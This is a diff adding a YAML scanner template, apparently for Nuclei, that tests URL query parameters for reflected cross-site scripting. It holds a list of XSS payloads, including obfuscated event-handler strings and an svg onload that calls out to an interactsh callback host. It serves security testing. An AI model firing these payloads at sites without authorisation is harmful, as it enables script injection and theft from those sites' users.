@@ -1,0 +1,48 @@
+id: xss-query
+
+info:
+  name: Reflected Cross Site Scripting
+  author: reewardius
+  severity: high
+  tags: fuzzing-req,fuzzing-req-xss,fuzzing-req-query,xss,dast
+  
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+        condition: and
+          
+    payloads:
+      reflection:
+        - "'\"><{{first}}"
+        - "<script>alert.?()</script>"
+        - '"><script>alert.?()</script>'
+        - "'><script>alert.?()</script>"
+        - '"><img src="X" onerror=top[8680439..toString(30)](1337)>'
+        - "\"/>'/><svg/onload=(new(Image)).src='//{{interactsh-url}}/'>"
+        - "\"/>'/><script>"
+        - "<a/href/='https://google.com/#><img src=x onerror=alert()>slon</img></h1>'>google</a>"
+        
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+          
+      - type: word
+        part: header
+        words:
+          - "text/html"
